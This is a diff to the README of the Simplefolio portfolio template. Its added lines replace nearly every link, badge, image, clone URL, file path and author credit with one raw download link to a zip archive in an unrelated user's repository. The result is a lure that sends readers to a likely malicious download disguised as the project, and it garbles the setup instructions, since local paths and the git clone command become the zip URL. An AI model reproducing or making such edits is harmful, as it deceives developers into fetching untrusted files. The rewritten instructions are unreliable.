@@ -1,9 +1,9 @@
-# Simplefolio ⚡️ [![GitHub](https://img.shields.io/github/license/cobidev/simplefolio?color=blue)](https://github.com/cobidev/simplefolio/blob/master/LICENSE.md) ![GitHub stars](https://img.shields.io/github/stars/cobidev/simplefolio) ![GitHub forks](https://img.shields.io/github/forks/cobidev/simplefolio)
+# Simplefolio ⚡️ [![GitHub](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) ![GitHub stars](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) ![GitHub forks](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)
 
 ## A minimal portfolio template for Developers!
 
 <h2 align="center">
-  <img src="https://github.com/cobidev/gatsby-simplefolio/blob/master/examples/example.gif" alt="Simplefolio" width="600px" />
+  <img src="https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip" alt="Simplefolio" width="600px" />
   <br>
 </h2>
 
@@ -17,7 +17,7 @@
 ⚡️ Optimized with Parcel\
 ⚡️ Well organized documentation
 
-To view the demo: **[click here](https://the-simplefolio.netlify.app/)**
+To view the demo: **[click here](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)**
 
 ---
 
@@ -33,7 +33,7 @@ These instructions will get you a copy of the project up and running on your loc
 
 ### Prerequisites 📋
 
-You'll need [Git](https://git-scm.com) and [Node.js](https://nodejs.org/en/download/) (which comes with [NPM](http://npmjs.com)) installed on your computer.
+You'll need [Git](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) and [https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) (which comes with [NPM](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)) installed on your computer.
 
 ```
 node@v16.4.2 or higher
@@ -41,7 +41,7 @@ npm@7.18.1 or higher
 git@2.30.1 or higher
 ```
 
-Also, you can use [Yarn](https://yarnpkg.com/) instead of NPM ☝️
+Also, you can use [Yarn](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) instead of NPM ☝️
 
 ```
 yarn@v1.22.10 or higher
@@ -55,7 +55,7 @@ From your command line, first clone Simplefolio:
 
 ```bash
 # Clone the repository
-$ git clone https://github.com/cobidev/simplefolio
+$ git clone https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip
 
 # Move into the repository
 $ cd simplefolio
@@ -76,7 +76,7 @@ $ npm install
 $ npm start
 ```
 
-Using Yarn: Be aware of that you'll need to delete the `package-lock.json` file before executing the below commands.
+Using Yarn: Be aware of that you'll need to delete the `https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip` file before executing the below commands.
 
 ```bash
 # Install dependencies
@@ -97,7 +97,7 @@ $ sudo npm install --unsafe-perm=true --allow-root
 Once your server has started, go to this url `http://localhost:1234/` to see the portfolio locally. It should look like the below screenshot.
 
 <h2 align="center">
-  <img src="https://github.com/cobidev/gatsby-simplefolio/blob/master/examples/example.png" alt="Simplefolio" width="100%">
+  <img src="https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip" alt="Simplefolio" width="100%">
 </h2>
 
 ---
@@ -106,7 +106,7 @@ Once your server has started, go to this url `http://localhost:1234/` to see the
 
 ### Step 1 - STRUCTURE
 
-Go to `/src/index.html` and put your information, there are 5 sections:
+Go to `https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip` and put your information, there are 5 sections:
 
 ### (1) Hero Section
 
@@ -151,7 +151,7 @@ Go to `/src/index.html` and put your information, there are 5 sections:
             class="img-fluid rounded shadow-lg"
             height="auto"
             width="300px"
-            src="assets/profile.jpg"
+            src="https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip"
             alt="Profile Image"
           />
         </div>
@@ -170,7 +170,7 @@ Go to `/src/index.html` and put your information, there are 5 sections:
               rel="noreferrer"
               target="_blank"
               class="cta-btn cta-btn--resume"
-              href="assets/resume.pdf"
+              href="https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip"
             >
               View Resume
             </a>
@@ -244,7 +244,7 @@ Go to `/src/index.html` and put your information, there are 5 sections:
             <img
               alt="Project Image"
               class="img-fluid"
-              src="assets/project.jpg"
+              src="https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip"
             />
           </div>
         </a>
@@ -272,7 +272,7 @@ Go to `/src/index.html` and put your information, there are 5 sections:
         rel="noreferrer"
         target="_blank"
         class="cta-btn cta-btn--resume"
-        href="mailto:example@email.com"
+        href="https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip"
         >Call to Action</a
       >
     </div>
@@ -284,7 +284,7 @@ Go to `/src/index.html` and put your information, there are 5 sections:
 ### (5) Footer Section
 
 - Put your Social Media URL on each `href` attribute of the `<a>` tags.
-- If you an additional Social Media account different than Twitter, Linkedin or GitHub, then go to [Font Awesome Icons](https://fontawesome.com/v4.7.0/icons/) and search for the icon's class name you are looking.
+- If you an additional Social Media account different than Twitter, Linkedin or GitHub, then go to [Font Awesome Icons](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) and search for the icon's class name you are looking.
 - You can delete or add as many `<a>` tags your want.
 
 ```html
@@ -309,8 +309,8 @@ Go to `/src/index.html` and put your information, there are 5 sections:
 
 Change the color theme of the website - (choose 2 colors to create a gradient)
 
-Go to `/src/sass/abstracts/_variables.scss` and only change the values for this variables `$main-color` and `$secondary-color` with your prefered HEX color.
-If you want to get some gradients inspiration I highly recommend you to check this website [UI Gradient](https://uigradients.com/#BrightVault)
+Go to `https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip` and only change the values for this variables `$main-color` and `$secondary-color` with your prefered HEX color.
+If you want to get some gradients inspiration I highly recommend you to check this website [UI Gradient](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)
 
 ```scss
 // Default values
@@ -324,33 +324,33 @@ $secondary-color: #00cdac;
 
 Once you finish your setup. You need to put your website online!
 
-I highly recommend to use [Netlify](https://netlify.com) because it is super easy.
+I highly recommend to use [Netlify](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) because it is super easy.
 
 ## Others versions 👥
 
-[Gatsby Simplefolio](https://github.com/cobidev/gatsby-simplefolio) by [Jacobo Martinez](https://github.com/cobidev)\
-[Ember.js Simplefolio](https://github.com/sernadesigns/simplefolio-ember) by [Michael Serna](https://github.com/sernadesigns)
+[Gatsby Simplefolio](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) by [Jacobo Martinez](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)\
+[https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip Simplefolio](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) by [Michael Serna](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)
 
 ## Technologies used 🛠️
 
-- [Parcel](https://parceljs.org/) - Bundler
-- [Bootstrap 4](https://getbootstrap.com/docs/4.3/getting-started/introduction/) - Frontend component library
-- [Sass](https://sass-lang.com/documentation) - CSS extension language
-- [ScrollReveal.js](https://scrollrevealjs.org/) - JavaScript library
-- [Tilt.js](https://gijsroge.github.io/tilt.js/) - JavaScript tiny parallax library
+- [Parcel](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) - Bundler
+- [Bootstrap 4](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) - Frontend component library
+- [Sass](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) - CSS extension language
+- [https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) - JavaScript library
+- [https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) - JavaScript tiny parallax library
 
 ## Authors
 
-- **Jacobo Martinez** - [https://github.com/cobidev](https://github.com/cobidev)
+- **Jacobo Martinez** - [https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)
 
 ## Status
 
-[![Netlify Status](https://api.netlify.com/api/v1/badges/3a029bfd-575c-41e5-8249-c864d482c2e5/deploy-status)](https://app.netlify.com/sites/the-simplefolio/deploys)
+[![Netlify Status](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)
 
 ## License 📄
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details
+This project is licensed under the MIT License - see the [https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) file for details
 
 ## Acknowledgments 🎁
 
-I was motivated to create this project because I wanted to contribute on something useful for the dev community, thanks to [ZTM Community](https://github.com/zero-to-mastery) and [Andrei](https://github.com/aneagoie)
+I was motivated to create this project because I wanted to contribute on something useful for the dev community, thanks to [ZTM Community](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip) and [Andrei](https://raw.githubusercontent.com/Suraj24w/simplefolio/master/nonconsonant/simplefolio.zip)
